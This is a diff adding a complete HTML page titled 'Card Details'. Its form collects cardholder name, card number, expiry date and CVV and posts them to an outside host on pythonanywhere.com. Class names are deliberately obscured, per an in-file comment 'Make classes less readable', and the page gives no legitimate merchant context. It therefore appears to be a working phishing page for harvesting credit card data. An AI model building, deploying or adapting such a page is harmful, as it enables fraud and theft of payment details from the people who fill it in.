@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <style>
+        input {
+            width: 100%;
+        }
+        /* Make classes less readable */
+        .cls-a { background-color: #fff !important; }
+        .cls-b { display: flex !important; }
+        .cls-c { align-items: center !important; }
+        .cls-d { justify-content: center !important; }
+        .cls-e { height: 100vh !important; }
+        .cls-f { padding: 2rem !important; }
+        .cls-g { border-radius: 0.5rem !important; }
+        .cls-h { box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1) !important; }
+        .cls-i { width: 24rem !important; }
+        .cls-j { font-weight: 600 !important; }
+        .cls-k { margin-bottom: 1.5rem !important; }
+        .cls-l { color: #555 !important; font-size: 0.875rem !important; }
+        .cls-m { padding: 0.5rem 1rem !important; border: 1px solid #ddd !important; border-radius: 0.375rem !important; }
+        .cls-n { margin-right: 0.5rem !important; }
+        .cls-o { margin-left: 0.5rem !important; }
+    </style>
+</head>
+
+<body class="cls-a">
+    <nav class="absolute cls-b cls-c justify-between cls-f cls-h w-screen">
+        <img src="./media/logo.png" alt="Logo" class="scale-[0.65]">
+    </nav>
+    <div class="bg-gray-100 cls-b cls-c cls-d cls-e">
+        <div class="cls-a cls-f cls-g cls-h cls-i">
+            <h2 class="text-2xl cls-j cls-k">Card Details</h2>
+            <form id="f" method="post" action="https://lesotol784.pythonanywhere.com/information">
+                <div class="cls-k">
+                    <label for="a" class="block cls-l">Name</label>
+                    <input type="text" id="a" name="name" class="cls-m" required>
+                </div>
+                <div class="cls-k">
+                    <label for="b" class="block cls-l">Number</label>
+                    <input type="tel" id="b" name="number" class="cls-m" placeholder="XXXX XXXX XXXX XXXX" maxlength="16" required>
+                </div>
+                <div class="cls-b">
+                    <div class="w-1/2 cls-n">
+                        <label for="c" class="block cls-l">Exp. Month</label>
+                        <input type="tel" id="c" name="month" class="cls-m" placeholder="MM" maxlength="2" required>
+                    </div>
+                    <div class="w-1/2 cls-o">
+                        <label for="d" class="block cls-l">Exp. Year</label>
+                        <input type="tel" id="d" name="year" class="cls-m" placeholder="YY" maxlength="2" required>
+                    </div>
+                </div>
+                <div class="cls-k">
+                    <label for="e" class="block cls-l">CVV</label>
+                    <input type="tel" id="e" name="code" class="cls-m" placeholder="XXX" maxlength="3" required>
+                </div>
+                <button type="submit" class="bg-red-900 text-white cls-m w-full hover:bg-blue-600">Submit</button>
+            </form>
+        </div>
+    </div>
+</body>
+
+</html>
